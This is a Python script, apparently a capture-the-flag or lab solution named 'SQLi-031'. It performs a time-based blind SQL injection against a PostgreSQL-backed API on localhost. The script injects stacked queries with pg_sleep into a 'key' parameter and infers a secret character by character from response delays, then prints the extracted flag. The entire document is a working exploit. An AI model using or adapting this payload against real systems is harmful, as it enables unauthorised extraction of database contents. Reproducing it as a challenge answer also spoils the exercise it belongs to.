#!/usr/bin/env python3
"""SQLi-031: PostgreSQL pg_sleep Exploit"""
import requests, time, string

def check(cond):
    start = time.time()
    payload = f"key_abc123'; SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
    requests.get(f"http://localhost:5031/api/check?key={requests.utils.quote(payload)}", timeout=30)
    return time.time() - start > 1.5

def extract(table, column):
    result = ""
    for pos in range(1, 50):
        for c in string.ascii_letters + string.digits + "_{}" :
            if check(f"(SELECT SUBSTRING({column},{pos},1) FROM {table})='{c}'"):
                result += c
                print(f"[+] {column}: {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("SQLi-031: PostgreSQL pg_sleep Exploit")
    flag = extract("flags", "value")
    print(f"[+] FLAG: {flag}")
